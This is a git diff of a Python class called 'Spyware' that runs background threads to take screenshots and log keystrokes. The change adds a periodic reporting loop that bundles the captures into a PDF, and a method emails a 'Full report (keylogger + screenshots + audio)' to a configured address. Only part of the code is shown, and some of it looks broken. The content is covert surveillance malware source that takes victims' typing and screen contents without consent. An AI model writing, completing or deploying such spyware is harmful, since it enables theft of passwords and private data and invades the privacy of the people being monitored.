@@ -16,9 +16,8 @@ from modules.send_email import send_mail
 
 class Spyware:
     def __init__(self):
-        self.screenshot_period = 5
-        self.keylogger_period = 5
         self.keylogger_report = ''
+        self.screenshot_period = 5
 
         with open('./user_info/info.json') as input_file:
             reader = input_file.reader()
@@ -32,20 +31,21 @@ class Spyware:
         if not os.path.isdir(f'{user_path}\\images_record'):
             os.mkdir(f'{user_path}\\images_record')
 
-        async_tasks = [Thread(target=visual.make_screenshot, daemon=True), Thread(target=logger.init, daemon=True),
-                       Thread(target=self.get_keylogger_report, daemon=True)]
+        async_tasks = [
+                Thread(target=visual.make_screenshot, daemon=True),
+                Thread(target=logger.init, daemon=True),
+                Thread(target=self.reporting, daemon=True)
+        ]
+
         [t.start() for t in async_tasks]
 
+    def reporting(self):
         while True:
-            que = input('')
+            sleep(self.user_info.frequency)
+            visual.make_pdf()
+            log = logger.get_log()
 
-            if que == 'k':
-                visual.change_state()
-                visual.make_pdf()
-                break
-            else:
-                print('\n')
-        [t.join() for t in async_tasks]
+            # self.send_report()
 
     def send_report(self, file_path):
         message_rep = 'Full report (keylogger + screenshots + audio)'
@@ -54,13 +54,6 @@ class Spyware:
         except:
             error_msg = 'Could not send that'
             send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)
-
-    def get_keylogger_report(self, logger_instance):
-        self.keylogger_report += logger_instance.get_log()
-
-        while True:
-            sleep(self.keylogger_period)
-            self.keylogger_report += logger_instance.get_log()
 
 
 if __name__ == '__main__':
